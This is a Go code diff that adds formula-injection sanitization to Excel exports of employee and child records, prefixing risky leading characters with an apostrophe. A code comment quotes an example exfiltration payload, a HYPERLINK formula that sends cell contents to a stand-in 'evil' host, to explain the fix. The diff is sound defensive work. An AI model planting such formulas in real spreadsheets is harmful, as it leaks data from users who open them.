@@ -42,6 +42,33 @@ func numberStyle(f *excelize.File) (int, error) {
 
 func strPtr(s string) *string { return &s }
 
+// sanitizeCell neutralizes leading characters that Excel and LibreOffice
+// interpret as formula triggers (=, +, -, @) or argument separators
+// (\t, \r). A user-controlled tenant string like
+// `=HYPERLINK("http://evil/?"&A1,"click")` would otherwise execute when a
+// different user opens the exported workbook.
+//
+// The fix is the CSV-injection-standard: prepend an apostrophe so the cell
+// reads as literal text. The apostrophe is not shown by Excel/LibreOffice
+// but is visible in CSV and to text readers — acceptable tradeoff.
+func sanitizeCell(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
+}
+
+// setStringCell writes a user-controllable string value with injection
+// sanitization applied. Every cell that originates from tenant data MUST go
+// through this helper rather than calling SetCellValue directly.
+func setStringCell(f *excelize.File, sheet, c, value string) {
+	_ = f.SetCellValue(sheet, c, sanitizeCell(value))
+}
+
 // genderDE maps English gender values to German.
 func genderDE(g string) string {
 	switch strings.ToLower(g) {
@@ -118,9 +145,9 @@ func WriteEmployeesExcel(w io.Writer, employees []models.EmployeeResponse) error
 	// Write data rows
 	for i, emp := range employees {
 		row := i + 2
-		_ = f.SetCellValue(sheet, cell(1, row), emp.FirstName)
-		_ = f.SetCellValue(sheet, cell(2, row), emp.LastName)
-		_ = f.SetCellValue(sheet, cell(3, row), genderDE(emp.Gender))
+		setStringCell(f, sheet, cell(1, row), emp.FirstName)
+		setStringCell(f, sheet, cell(2, row), emp.LastName)
+		setStringCell(f, sheet, cell(3, row), genderDE(emp.Gender))
 		setDateCell(f, sheet, cell(4, row), emp.Birthdate, dStyle)
 
 		if len(emp.Contracts) > 0 {
@@ -129,10 +156,10 @@ func WriteEmployeesExcel(w io.Writer, employees []models.EmployeeResponse) error
 			if ct.SectionName != nil {
 				sectionName = *ct.SectionName
 			}
-			_ = f.SetCellValue(sheet, cell(5, row), sectionName)
-			_ = f.SetCellValue(sheet, cell(6, row), ct.StaffCategory)
+			setStringCell(f, sheet, cell(5, row), sectionName)
+			setStringCell(f, sheet, cell(6, row), ct.StaffCategory)
 			_ = f.SetCellValue(sheet, cell(7, row), ct.Step)
-			_ = f.SetCellValue(sheet, cell(8, row), ct.Grade)
+			setStringCell(f, sheet, cell(8, row), ct.Grade)
 
 			_ = f.SetCellValue(sheet, cell(9, row), ct.WeeklyHours)
 			_ = f.SetCellStyle(sheet, cell(9, row), cell(9, row), nStyle)
@@ -191,9 +218,9 @@ func WriteChildrenExcel(w io.Writer, children []models.ChildResponse) error {
 	// Write data rows
 	for i, child := range children {
 		row := i + 2
-		_ = f.SetCellValue(sheet, cell(1, row), child.FirstName)
-		_ = f.SetCellValue(sheet, cell(2, row), child.LastName)
-		_ = f.SetCellValue(sheet, cell(3, row), genderDE(child.Gender))
+		setStringCell(f, sheet, cell(1, row), child.FirstName)
+		setStringCell(f, sheet, cell(2, row), child.LastName)
+		setStringCell(f, sheet, cell(3, row), genderDE(child.Gender))
 		setDateCell(f, sheet, cell(4, row), child.Birthdate, dStyle)
 
 		if len(child.Contracts) > 0 {
@@ -202,14 +229,14 @@ func WriteChildrenExcel(w io.Writer, children []models.ChildResponse) error {
 			if ct.SectionName != nil {
 				sectionName = *ct.SectionName
 			}
-			_ = f.SetCellValue(sheet, cell(5, row), sectionName)
+			setStringCell(f, sheet, cell(5, row), sectionName)
 			setDateCell(f, sheet, cell(6, row), ct.From, dStyle)
 			setOptionalDateCell(f, sheet, cell(7, row), ct.To, dStyle)
 
-			_ = f.SetCellValue(sheet, cell(8, row), ct.Properties.GetScalarProperty("care_type"))
+			setStringCell(f, sheet, cell(8, row), ct.Properties.GetScalarProperty("care_type"))
 
 			supplements := ct.Properties.GetArrayProperty("supplements")
-			_ = f.SetCellValue(sheet, cell(9, row), strings.Join(supplements, ", "))
+			setStringCell(f, sheet, cell(9, row), strings.Join(supplements, ", "))
 		}
 	}
 
